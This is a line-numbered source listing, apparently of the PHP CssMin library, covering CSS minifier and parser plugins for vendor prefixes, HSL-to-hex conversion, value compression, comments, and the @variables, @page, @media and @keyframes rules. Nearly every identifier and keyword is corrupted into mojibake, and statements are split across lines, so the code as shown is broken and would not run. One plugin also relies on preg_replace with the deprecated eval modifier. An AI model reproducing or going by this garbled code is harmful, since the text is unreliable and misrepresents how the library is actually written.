("-moz-u£r-šput", 
nuÎ
,‚ull,‚ull),

3185 "u£r-modify" => 
¬¿y
("-moz-u£r-modify", "-webk™-u£r-modify", 
nuÎ
,‚ull),

3186 "u£r-£Ëù" => 
¬¿y
("-moz-u£r-£Ëù", "-webk™-u£r-£Ëù", 
nuÎ
,‚ull),

3187 "wh™e-¥aû" => 
¬¿y
(
__CLASS__
, "whiteSpace"),

3188 "wšdow-shadow" => 
¬¿y
("-moz-wšdow-shadow", 
nuÎ
,‚ull,‚ull),

3189 "wÜd-b»ak" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-word-break"),

3190 "wÜd-w¿p" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-word-wrap"),

3191 "wr™šg-mode" => 
¬¿y
(
nuÎ
, "-webkit-writing-mode",‚ull, "-ms-writing-mode"),

3192 "zoom" => 
¬¿y
(
nuÎ
,‚ull,‚ull, "-ms-zoom")

3200 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

3202 
$r
 = 0;

3203 
$ŒªsfÜm©iÚs
 = &
$this
->
ŒªsfÜm©iÚs
;

3204 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

3206 ià(
	`g‘_şass
(
$tok’s
[
$i
]) === "CssRulesetDeclarationToken")

3208 
$tPrİ”ty
 = 
$tok’s
[
$i
]->
Prİ”ty
;

3209 ià(
	`is£t
(
$ŒªsfÜm©iÚs
[
$tPrİ”ty
]))

3211 
$»suÉ
 = 
	`¬¿y
();

3212 ià(
	`is_ÿÎabË
(
$ŒªsfÜm©iÚs
[
$tPrİ”ty
]))

3214 
$»suÉ
 = 
	`ÿÎ_u£r_func_¬¿y
(
$ŒªsfÜm©iÚs
[
$tPrİ”ty
], 
	`¬¿y
(
$tok’s
[
$i
]));

3215 ià(!
	`is_¬¿y
(
$»suÉ
è&& 
	`is_objeù
($result))

3217 
$»suÉ
 = 
	`¬¿y
($result);

3222 
$tV®ue
 = 
$tok’s
[
$i
]->
V®ue
;

3223 
$tMedŸTy³s
 = 
$tok’s
[
$i
]->
MedŸTy³s
;

3224 
	`fÜ—ch
 (
$ŒªsfÜm©iÚs
[
$tPrİ”ty
] 
as
 
$´İ”ty
)

3226 ià(
$´İ”ty
 !=ğ
nuÎ
)

3228 
$»suÉ
[] = 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
(
$´İ”ty
, 
$tV®ue
, 
$tMedŸTy³s
);

3232 ià(
	`couÁ
(
$»suÉ
) > 0)

3234 
	`¬¿y_¥liû
(
$tok’s
, 
$i
 + 1, 0, 
$»suÉ
);

3235 
$i
 +ğ
	`couÁ
(
$»suÉ
);

3236 
$l
 +ğ
	`couÁ
(
$»suÉ
);

3241  
$r
;

3250 
´iv©e
 
funùiÚ
 
	$f‹r
(
$tok’
)

3252 
$r
 = 
¬¿y


3254 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("-ms-f‹r", "\"" . 
$tok’
->
V®ue
 . "\"", $tok’->
MedŸTy³s
),

3256  
$r
;

3257 
	}
}

3264 
´iv©e
 
funùiÚ
 
	$İac™y
(
$tok’
)

3267 
$›V®ue
 = (è((è
$tok’
->
V®ue
 * 100);

3268 
$r
 = 
¬¿y


3271 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("-ms-f‹r", "\"®pha(İac™y=" . 
$›V®ue
 . ")\"", 
$tok’
->
MedŸTy³s
),

3273 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("f‹r", "®pha(İac™y=" . 
$›V®ue
 . ")", 
$tok’
->
MedŸTy³s
),

3274 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("zoom", "1", 
$tok’
->
MedŸTy³s
)

3276  
$r
;

3277 
	}
}

3284 
´iv©e
 
funùiÚ
 
	$wh™eS·û
(
$tok’
)

3286 ià(
	`¡¹Şow”
(
$tok’
->
V®ue
) === "pre-wrap")

3288 
$r
 = 
¬¿y


3291 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("wh™e-¥aû", "-moz-´e-w¿p", 
$tok’
->
MedŸTy³s
),

3293 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("wh™e-¥aû", "-webk™-´e-w¿p", 
$tok’
->
MedŸTy³s
),

3295 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("wh™e-¥aû", "-´e-w¿p", 
$tok’
->
MedŸTy³s
),

3297 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("wh™e-¥aû", "-o-´e-w¿p", 
$tok’
->
MedŸTy³s
),

3299 
Ãw
 
	`CssRuË£tDeş¬©iÚTok’
("wÜd-w¿p", "b»ak-wÜd", 
$tok’
->
MedŸTy³s
)

3301  
$r
;

3305  
	`¬¿y
();

3307 
	}
}

3320 şas 
	cCssCÚv”tLev–3AtKeyäamesMšif›rF‹r
 
ex‹nds
 
	maCssMšif›rF‹r


3328 
public
 
funùiÚ
 
	$­¶y
(
¬¿y
 &
$tok’s
)

3330 
$r
 = 0;

3331 
$ŒªsfÜm©iÚs
 = 
	`¬¿y
("-moz-keyframes", "-webkit-keyframes");

3332 
$i
 = 0, 
$l
 = 
	`couÁ
(
$tok’s
); $i < $l; $i++)

3334 ià(
	`g‘_şass
(
$tok’s
[
$i
]) === "CssAtKeyframesStartToken")

3336 
$ii
 = 
$i
; $i˜< 
$l
; $ii++)

3338 ià(
	`g‘_şass
(
$tok’s
[
$ii
]) === "CssAtKeyframesEndToken")

3343 ià(
	`g‘_şass
(
$tok’s
[
$ii
]) === "CssAtKeyframesEndToken")

3345 
$add
 = 
	`¬¿y
();

3346 
$sourû
 = 
	`¬¿y
();

3347 
$iii
 = 
$i
; $ii˜<ğ
$ii
; $iii++)

3349 
$sourû
[] = 
	`şÚe
(
$tok’s
[
$iii
]);

3351 
	`fÜ—ch
 (
$ŒªsfÜm©iÚs
 
as
 
$ŒªsfÜm©iÚ
)

3353 
$t
 = 
	`¬¿y
();

3354 
	`fÜ—ch
 (
$sourû
 
as
 
$tok’
)

3356 
$t
[] = 
	`şÚe
(
$tok’
);

3358 
$t
[0]->
AtRuËName
 = 
$ŒªsfÜm©iÚ
;

3359 
$add
 = 
	`¬¿y_m”ge
($add, 
$t
);

3361 ià(
	`is£t
(
$this
->
cÚfigu¿tiÚ
["RemoveSourû"]è&& $this->cÚfigu¿tiÚ["RemoveSourû"] ==ğ
Œue
)

3363 
	`¬¿y_¥liû
(
$tok’s
, 
$i
, 
$ii
 - $˜+ 1, 
$add
);

3367 
	`¬¿y_¥liû
(
$tok’s
, 
$ii
 + 1, 0, 
$add
);

3369 
$l
 = 
	`couÁ
(
$tok’s
);

3370 
$i
 = 
$ii
 + 
	`couÁ
(
$add
);

3371 
$r
 +ğ
	`couÁ
(
$add
);

3375  
$r
;

3377 
	}
}

3399 şas 
	cCssCÚv”tH¦CŞÜsMšif›rPlugš
 
ex‹nds
 
	maCssMšif›rPlugš


3406 
´iv©e
 
	m$»M©ch
 = "/^hsl\s*\(\s*([0-9]+)\s*,\s*([0-9]+)\s*%\s*,\s*([0-9]+)\s*%\s*\)/iS";

3413 
public
 
funùiÚ
 
	$­¶y
(
aCssTok’
 &
$tok’
)

3415 ià(
	`¡ros
(
$tok’
->
V®ue
, "h¦"è!=ğ
çl£
 && 
	`´eg_m©ch
(
$this
->
»M©ch
, $tok’->V®ue, 
$m
))

3417 
$tok’
->
V®ue
 = 
	`¡r_»¶aû
(
$m
[0], 
$this
->
	`h¦2hex
($m[1], $m[2], $m[3]), $token->Value);

3419  
çl£
;

3426 
public
 
funùiÚ
 
	$g‘Trigg”Tok’s
()

3428  
¬¿y


3434 
	}
}

3445 
´iv©e
 
funùiÚ
 
	$h¦2hex
(
$hue
, 
$§tu¿tiÚ
, 
$lighŠess
)

3447 
$hue
 = $hue / 360;

3448 
$§tu¿tiÚ
 = $saturation / 100;

3449 
$lighŠess
 = $lightness / 100;

3450 ià(
$§tu¿tiÚ
 == 0)

3452 
$»d
 = 
$lighŠess
 * 255;

3453 
$g»’
 = 
$lighŠess
 * 255;

3454 
$blue
 = 
$lighŠess
 * 255;

3458 ià(
$lighŠess
 < 0.5 )

3460 
$v2
 = 
$lighŠess
 * (1 + 
$§tu¿tiÚ
);

3464 
$v2
 = (
$lighŠess
 + 
$§tu¿tiÚ
) - ($saturation * $lightness);

3466 
$v1
 = 2 * 
$lighŠess
 - 
$v2
;

3467 
$»d
 = 255 * 
£lf
::
	`hue2rgb
(
$v1
, 
$v2
, 
$hue
 + (1 / 3));

3468 
$g»’
 = 255 * 
£lf
::
	`hue2rgb
(
$v1
, 
$v2
, 
$hue
);

3469 
$blue
 = 255 * 
£lf
::
	`hue2rgb
(
$v1
, 
$v2
, 
$hue
 - (1 / 3));

3471  "#" . 
	`¡r_·d
(
	`dechex
(
	`round
(
$»d
)), 2, "0", 
STR_PAD_LEFT
è. sŒ_·d(dechexÔound(
$g»’
)), 2, "0", STR_PAD_LEFTè. sŒ_·d(dechexÔound(
$blue
)), 2, "0", STR_PAD_LEFT);

3472 
	}
}

3481 
´iv©e
 
funùiÚ
 
	$hue2rgb
(
$v1
, 
$v2
, 
$hue
)

3483 ià(
$hue
 < 0)

3485 
$hue
 += 1;

3487 ià(
$hue
 > 1)

3489 
$hue
 -= 1;

3491 ià((6 * 
$hue
) < 1)

3493  (
$v1
 + (
$v2
 - $v1è* 6 * 
$hue
);

3495 ià((2 * 
$hue
) < 1)

3497  (
$v2
);

3499 ià((3 * 
$hue
) < 2)

3501  (
$v1
 + (
$v2
 - $v1è* (Ğ2 / 3è- 
$hue
) * 6);

3503  
$v1
;

3504 
	}
}

3529 şas 
	cCssCÚv”tFÚtWeightMšif›rPlugš
 
ex‹nds
 
	maCssMšif›rPlugš


3537 
´iv©e
 
	m$šşude
 = 
¬¿y


3547 
´iv©e
 
	m$»M©ch
 = 
nuÎ
;

3553 
´iv©e
 
	m$»R•Ïû
 = "\"\${1}\" . \$this->transformation[\"\${2}\"] . \"\${3}\"";

3559 
´iv©e
 
	m$ŒªsfÜm©iÚ
 = 
¬¿y


3573 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
CssMšif›r
 
$mšif›r
)

3575 
$this
->
»M©ch
 = "/(^|\s)+(" . 
	`im¶ode
("|", 
	`¬¿y_keys
($this->
ŒªsfÜm©iÚ
)). ")(\s|$)+/eiS";

3576 
·»Á
::
	`__cÚ¡ruù
(
$mšif›r
);

3584 
public
 
funùiÚ
 
	$­¶y
(
aCssTok’
 &
$tok’
)

3586 ià(
	`š_¬¿y
(
$tok’
->
Prİ”ty
, 
$this
->
šşude
è&& 
	`´eg_m©ch
($this->
»M©ch
, $tok’->
V®ue
, 
$m
))

3588 
$tok’
->
V®ue
 = 
	`´eg_»¶aû
(
$this
->
»M©ch
, $this->
»R•Ïû
, $token->Value);

3590  
çl£
;

3591 
	}
}

3597 
public
 
funùiÚ
 
	$g‘Trigg”Tok’s
()

3599  
¬¿y


3605 
	}
}

3634 şas 
	cCssCom´essUn™V®uesMšif›rPlugš
 
ex‹nds
 
	maCssMšif›rPlugš


3641 
´iv©e
 
	m$»
 = 
¬¿y


3652 
´iv©e
 
	m$»M©ch
 = "/(^| |-)0\.([0-9]+?)(0+)?(%|em|ex|px|in|cm|mm|pt|pc)|(^| )-?(\.?)0(%|em|ex|px|in|cm|mm|pt|pc)|(^0\s0\s0\s0$)|(^0\s0\s0$)|(^0\s0$)/iS";

3659 
public
 
funùiÚ
 
	$­¶y
(
aCssTok’
 &
$tok’
)

3661 ià(
	`´eg_m©ch
(
$this
->
»M©ch
, 
$tok’
->
V®ue
))

3663 
	`fÜ—ch
 (
$this
->
»
 
as
 
$»M©ch
 => 
$»R•Ïû
)

3665 
$tok’
->
V®ue
 = 
	`´eg_»¶aû
(
$»M©ch
, 
$»R•Ïû
, $token->Value);

3668  
çl£
;

3675 
public
 
funùiÚ
 
	$g‘Trigg”Tok’s
()

3677  
¬¿y


3683 
	}
}

3699 şas 
	cCssCom´essEx´essiÚV®uesMšif›rPlugš
 
ex‹nds
 
	maCssMšif›rPlugš


3707 
public
 
funùiÚ
 
	$­¶y
(
aCssTok’
 &
$tok’
)

3709 ià(
	`şass_exi¡s
("JSMš"è&& 
	`¡ros
(
$tok’
->
V®ue
, "ex´essiÚ("è!=ğ
çl£
)

3711 
$v®ue
 = 
$tok’
->
V®ue
;

3712 
$v®ue
 = 
	`sub¡r
(
$tok’
->
V®ue
, 
	`¡ros
($token->Value, "expression(") + 10);

3713 
$v®ue
 = 
	`Œim
(
JSMš
::
	`mšify
($value));

3714 
$tok’
->
V®ue
 = "ex´essiÚ(" . 
$v®ue
 . ")";

3716  
çl£
;

3723 
public
 
funùiÚ
 
	$g‘Trigg”Tok’s
()

3725  
¬¿y


3731 
	}
}

3755 şas 
	cCssCom´essCŞÜV®uesMšif›rPlugš
 
ex‹nds
 
	maCssMšif›rPlugš


3762 
´iv©e
 
	m$»M©ch
 = "/\#([0-9a-f]{6})/iS";

3769 
public
 
funùiÚ
 
	$­¶y
(
aCssTok’
 &
$tok’
)

3771 ià(
	`¡½os
(
$tok’
->
V®ue
, "#"è!=ğ
çl£
 && 
	`´eg_m©ch
(
$this
->
»M©ch
, $tok’->V®ue, 
$m
))

3773 
$v®ue
 = 
	`¡¹Şow”
(
$m
[1]);

3774 ià(
$v®ue
[0] == $value[1] && $value[2] == $value[3] && $value[4] == $value[5])

3776 
$tok’
->
V®ue
 = 
	`¡r_»¶aû
(
$m
[0], "#" . 
$v®ue
[0] . $value[2] . $value[4], $token->Value);

3779  
çl£
;

3786 
public
 
funùiÚ
 
	$g‘Trigg”Tok’s
()

3788  
¬¿y


3794 
	}
}

3807 şas 
	cCssComm’tTok’
 
ex‹nds
 
	maCssTok’


3814 
public
 
	m$Comm’t
 = "";

3821 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$comm’t
)

3823 
$this
->
Comm’t
 = 
$comm’t
;

3830 
public
 
funùiÚ
 
	$__toSŒšg
()

3832  
$this
->
Comm’t
;

3833 
	}
}

3848 şas 
	cCssComm’tP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


3855 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

3857  
	`¬¿y
("*", "/");

3864 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

3866  
çl£
;

3867 
	}
}

3873 
´iv©e
 
	g$»¡ÜeBufãr
 = "";

3882 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

3884 ià(
$ch¬
 ==ğ"*" && 
$´eviousCh¬
 ==ğ"/" && 
$¡©e
 !== "T_COMMENT")

3886 
$this
->
·r£r
->
	`pushS‹
("T_COMMENT");

3887 
$this
->
·r£r
->
	`£tExşusive
(
__CLASS__
);

3888 
$this
->
»¡ÜeBufãr
 = 
	`sub¡r
($this->
·r£r
->
	`g‘AndCË¬Bufãr
(), 0, -2);

3890 
	`–£if
 (
$ch¬
 ==ğ"/" && 
$´eviousCh¬
 ==ğ"*" && 
$¡©e
 === "T_COMMENT")

3892 
$this
->
·r£r
->
	`pİS‹
();

3893 
$this
->
·r£r
->
	`un£tExşusive
();

3894 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssComm’tTok’
("/*" . $this->·r£r->
	`g‘AndCË¬Bufãr
()));

3895 
$this
->
·r£r
->
	`£tBufãr
($this->
»¡ÜeBufãr
);

3899  
çl£
;

3901  
Œue
;

3902 
	}
}

3915 şas 
	cCssAtV¬ŸbËsS¹Tok’
 
ex‹nds
 
	maCssAtBlockS¹Tok’


3922 
public
 
	m$MedŸTy³s
 = 
¬¿y
();

3929 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$medŸTy³s
 = 
nuÎ
)

3931 
$this
->
MedŸTy³s
 = 
$medŸTy³s
 ? $medŸTy³ : 
	`¬¿y
("all");

3938 
public
 
funùiÚ
 
	$__toSŒšg
()

3941 
	}
}

3957 şas 
	cCssAtV¬ŸbËsP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


3964 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

3966  
	`¬¿y
("@", "{", "}", ":", ";");

3973 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

3975  
	`¬¿y
("T_DOCUMENT", "T_AT_VARIABLES::PREPARE", "T_AT_VARIABLES", "T_AT_VARIABLES_DECLARATION");

3976 
	}
}

3985 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

3988 ià(
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 10)) === "@variables")

3990 
$this
->
·r£r
->
	`pushS‹
("T_AT_VARIABLES::PREPARE");

3991 
$this
->
·r£r
->
	`ş—rBufãr
();

3992  
$šdex
 + 10;

3995 
	`–£if
 (
$ch¬
 ==ğ"{" && 
$¡©e
 === "T_AT_VARIABLES::PREPARE")

3997 
$this
->
·r£r
->
	`£tS‹
("T_AT_VARIABLES");

3998 
$medŸTy³s
 = 
	`¬¿y_f‹r
(
	`¬¿y_m­
("Œim", 
	`ex¶ode
(",", 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
("{"))));

3999 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtV¬ŸbËsS¹Tok’
(
$medŸTy³s
));

4002 ià(
$ch¬
 ==ğ":" && 
$¡©e
 === "T_AT_VARIABLES")

4004 
$this
->
bufãr
 = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(":");

4005 
$this
->
·r£r
->
	`pushS‹
("T_AT_VARIABLES_DECLARATION");

4008 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_AT_VARIABLES_DECLARATION")

4011 ià(
$this
->
bufãr
 === "filter")

4013  
çl£
;

4015 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": UÁ”mš©ed @v¬ŸbË deş¬©iÚ", 
$this
->
bufãr
 . ":" . $this->
·r£r
->
	`g‘Bufãr
() . "_"));

4018 
	`–£if
 ((
$ch¬
 ==ğ";" || $ch¬ ==ğ"}"è&& 
$¡©e
 === "T_AT_VARIABLES_DECLARATION")

4020 
$v®ue
 = 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
(";}");

4021 ià(
	`¡¹Şow”
(
	`sub¡r
(
$v®ue
, -10, 10)) === "!important")

4023 
$v®ue
 = 
	`Œim
(
	`sub¡r
($value, 0, -10));

4024 
$isImpÜÁ
 = 
Œue
;

4028 
$isImpÜÁ
 = 
çl£
;

4030 
$this
->
·r£r
->
	`pİS‹
();

4031 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtV¬ŸbËsDeş¬©iÚTok’
($this->
bufãr
, 
$v®ue
, 
$isImpÜÁ
));

4032 
$this
->
bufãr
 = "";

4035 
	`–£if
 (
$ch¬
 ==ğ"}" && 
$¡©e
 === "T_AT_VARIABLES")

4037 
$this
->
·r£r
->
	`pİS‹
();

4038 
$this
->
·r£r
->
	`ş—rBufãr
();

4039 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtV¬ŸbËsEndTok’
());

4043  
çl£
;

4045  
Œue
;

4046 
	}
}

4059 şas 
	cCssAtV¬ŸbËsEndTok’
 
ex‹nds
 
	maCssAtBlockEndTok’


4066 
public
 
funùiÚ
 
	$__toSŒšg
()

4070 
	}
}

4082 şas 
	cCssAtV¬ŸbËsDeş¬©iÚTok’
 
ex‹nds
 
	maCssDeş¬©iÚTok’


4089 
public
 
funùiÚ
 
	$__toSŒšg
()

4093 
	}
}

4105 şas 
	cCssAtPageS¹Tok’
 
ex‹nds
 
	maCssAtBlockS¹Tok’


4112 
public
 
	m$S–eùÜ
 = "";

4119 
public
 
funùiÚ
 
__cÚ¡ruù
(
$£ËùÜ
 = "")

4121 
$this
->
S–eùÜ
 = 
$£ËùÜ
;

4128 
public
 
funùiÚ
 
	$__toSŒšg
()

4130  "@·ge" . (
$this
->
S–eùÜ
 ? " " . $this->Selector : "") . "{";

4131 
	}
}

4147 şas 
	cCssAtPageP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


4154 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

4156  
	`¬¿y
("@", "{", "}", ":", ";");

4163 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

4165  
	`¬¿y
("T_DOCUMENT", "T_AT_PAGE::SELECTOR", "T_AT_PAGE", "T_AT_PAGE_DECLARATION");

4166 
	}
}

4175 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

4178 ià(
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 5)) === "@page")

4180 
$this
->
·r£r
->
	`pushS‹
("T_AT_PAGE::SELECTOR");

4181 
$this
->
·r£r
->
	`ş—rBufãr
();

4182  
$šdex
 + 5;

4185 
	`–£if
 (
$ch¬
 ==ğ"{" && 
$¡©e
 === "T_AT_PAGE::SELECTOR")

4187 
$£ËùÜ
 = 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
("{");

4188 
$this
->
·r£r
->
	`£tS‹
("T_AT_PAGE");

4189 
$this
->
·r£r
->
	`ş—rBufãr
();

4190 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtPageS¹Tok’
(
$£ËùÜ
));

4193 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_AT_PAGE")

4195 
$this
->
·r£r
->
	`pushS‹
("T_AT_PAGE_DECLARATION");

4196 
$this
->
bufãr
 = $this->
·r£r
->
	`g‘AndCË¬Bufãr
(":", 
Œue
);

4199 
	`–£if
 (
$ch¬
 ==ğ":" && 
$¡©e
 === "T_AT_PAGE_DECLARATION")

4202 ià(
$this
->
bufãr
 === "filter")

4204  
çl£
;

4206 
CssMš
::
	`Œigg”E¼Ü
(
Ãw
 
	`CssE¼Ü
(
__FILE__
, 
__LINE__
, 
__METHOD__
 . ": UÁ”mš©ed @·gdeş¬©iÚ", 
$this
->
bufãr
 . ":" . $this->
·r£r
->
	`g‘Bufãr
() . "_"));

4209 
	`–£if
 ((
$ch¬
 ==ğ";" || $ch¬ ==ğ"}"è&& 
$¡©e
 == "T_AT_PAGE_DECLARATION")

4211 
$v®ue
 = 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
(";}");

4212 ià(
	`¡¹Şow”
(
	`sub¡r
(
$v®ue
, -10, 10)) == "!important")

4214 
$v®ue
 = 
	`Œim
(
	`sub¡r
($value, 0, -10));

4215 
$isImpÜÁ
 = 
Œue
;

4219 
$isImpÜÁ
 = 
çl£
;

4221 
$this
->
·r£r
->
	`pİS‹
();

4222 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtPageDeş¬©iÚTok’
($this->
bufãr
, 
$v®ue
, 
$isImpÜÁ
));

4224 ià(
$ch¬
 === "}")

4226 
$this
->
·r£r
->
	`pİS‹
();

4227 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtPageEndTok’
());

4229 
$this
->
bufãr
 = "";

4232 
	`–£if
 (
$ch¬
 ==ğ"}" && 
$¡©e
 === "T_AT_PAGE")

4234 
$this
->
·r£r
->
	`pİS‹
();

4235 
$this
->
·r£r
->
	`ş—rBufãr
();

4236 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtPageEndTok’
());

4240  
çl£
;

4242  
Œue
;

4243 
	}
}

4256 şas 
	cCssAtPageEndTok’
 
ex‹nds
 
	maCssAtBlockEndTok’


4271 şas 
	cCssAtPageDeş¬©iÚTok’
 
ex‹nds
 
	maCssDeş¬©iÚTok’


4286 şas 
	cCssAtMedŸS¹Tok’
 
ex‹nds
 
	maCssAtBlockS¹Tok’


4294 
public
 
funùiÚ
 
__cÚ¡ruù
(
¬¿y
 
$medŸTy³s
 = 
	$¬¿y
())

4296 
$this
->
MedŸTy³s
 = 
$medŸTy³s
;

4303 
public
 
funùiÚ
 
	$__toSŒšg
()

4305  "@medŸ " . 
	`im¶ode
(",", 
$this
->
MedŸTy³s
) . "{";

4306 
	}
}

4323 şas 
	cCssAtMedŸP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


4330 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

4332  
	`¬¿y
("@", "{", "}");

4339 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

4341  
	`¬¿y
("T_DOCUMENT", "T_AT_MEDIA::PREPARE", "T_AT_MEDIA");

4342 
	}
}

4351 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

4353 ià(
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 6)) === "@media")

4355 
$this
->
·r£r
->
	`pushS‹
("T_AT_MEDIA::PREPARE");

4356 
$this
->
·r£r
->
	`ş—rBufãr
();

4357  
$šdex
 + 6;

4359 
	`–£if
 (
$ch¬
 ==ğ"{" && 
$¡©e
 === "T_AT_MEDIA::PREPARE")

4361 
$medŸTy³s
 = 
	`¬¿y_f‹r
(
	`¬¿y_m­
("Œim", 
	`ex¶ode
(",", 
$this
->
·r£r
->
	`g‘AndCË¬Bufãr
("{"))));

4362 
$this
->
·r£r
->
	`£tMedŸTy³s
(
$medŸTy³s
);

4363 
$this
->
·r£r
->
	`£tS‹
("T_AT_MEDIA");

4364 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtMedŸS¹Tok’
(
$medŸTy³s
));

4366 
	`–£if
 (
$ch¬
 ==ğ"}" && 
$¡©e
 === "T_AT_MEDIA")

4368 
$this
->
·r£r
->
	`­³ndTok’
(
Ãw
 
	`CssAtMedŸEndTok’
());

4369 
$this
->
·r£r
->
	`ş—rBufãr
();

4370 
$this
->
·r£r
->
	`un£tMedŸTy³s
();

4371 
$this
->
·r£r
->
	`pİS‹
();

4375  
çl£
;

4377  
Œue
;

4378 
	}
}

4391 şas 
	cCssAtMedŸEndTok’
 
ex‹nds
 
	maCssAtBlockEndTok’


4406 şas 
	cCssAtKeyäamesS¹Tok’
 
ex‹nds
 
	maCssAtBlockS¹Tok’


4413 
public
 
	m$AtRuËName
 = "keyframes";

4419 
public
 
	m$Name
 = "";

4426 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
$Çme
, 
$©RuËName
 = 
nuÎ
)

4428 
$this
->
Name
 = 
$Çme
;

4429 ià(!
	`is_nuÎ
(
$©RuËName
))

4431 
$this
->
AtRuËName
 = 
$©RuËName
;

4439 
public
 
funùiÚ
 
	$__toSŒšg
()

4441  "@" . 
$this
->
AtRuËName
 . " \"" . $this->
Name
 . "\"{";

4442 
	}
}

4455 şas 
	cCssAtKeyäamesRuË£tS¹Tok’
 
ex‹nds
 
	maCssRuË£tS¹Tok’


4462 
public
 
	m$S–eùÜs
 = 
¬¿y
();

4469 
public
 
funùiÚ
 
__cÚ¡ruù
(
¬¿y
 
$£ËùÜs
 = 
	$¬¿y
())

4471 
$this
->
S–eùÜs
 = 
$£ËùÜs
;

4478 
public
 
funùiÚ
 
	$__toSŒšg
()

4480  
	`im¶ode
(",", 
$this
->
S–eùÜs
) . "{";

4481 
	}
}

4494 şas 
	cCssAtKeyäamesRuË£tEndTok’
 
ex‹nds
 
	maCssRuË£tEndTok’


4509 şas 
	cCssAtKeyäamesRuË£tDeş¬©iÚTok’
 
ex‹nds
 
	maCssDeş¬©iÚTok’


4524 şas 
	cCssAtKeyäamesP¬£rPlugš
 
ex‹nds
 
	maCssP¬£rPlugš


4529 
´iv©e
 
	m$©RuËName
 = "";

4535 
´iv©e
 
	m$£ËùÜs
 = 
¬¿y
();

4541 
public
 
funùiÚ
 
	$g‘Trigg”Ch¬s
()

4543  
	`¬¿y
("@", "{", "}", ":", ",", ";");

4550 
public
 
funùiÚ
 
	$g‘Trigg”S‹s
()

4552  
	`¬¿y
("T_DOCUMENT", "T_AT_KEYFRAMES::NAME", "T_AT_KEYFRAMES", "T_AT_KEYFRAMES_RULESETS", "T_AT_KEYFRAMES_RULESET", "T_AT_KEYFRAMES_RULESET_DECLARATION");

4553 
	}
}

4562 
public
 
funùiÚ
 
	$·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
)

4565 ià(
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 10)) === "@keyframes")

4567 
$this
->
©RuËName
 = "keyframes";

4568 
$this
->
·r£r
->
	`pushS‹
("T_AT_KEYFRAMES::NAME");

4569 
$this
->
·r£r
->
	`ş—rBufãr
();

4570  
$šdex
 + 10;

4573 
	`–£if
 (
$ch¬
 ==ğ"@" && 
$¡©e
 ==ğ"T_DOCUMENT" && 
	`¡¹Şow”
(
	`sub¡r
(
$this
->
·r£r
->
	`g‘Sourû
(), 
$šdex
, 15)) === "@-moz-keyframes")

4575 
$this
->
©RuËName
 = "-moz-keyframes";

4576 
$this
->
·r£r
->
	`pushS‹
("T_AT_KEYFRAMES::NAME");

4577 
$this
->
·r£r
->
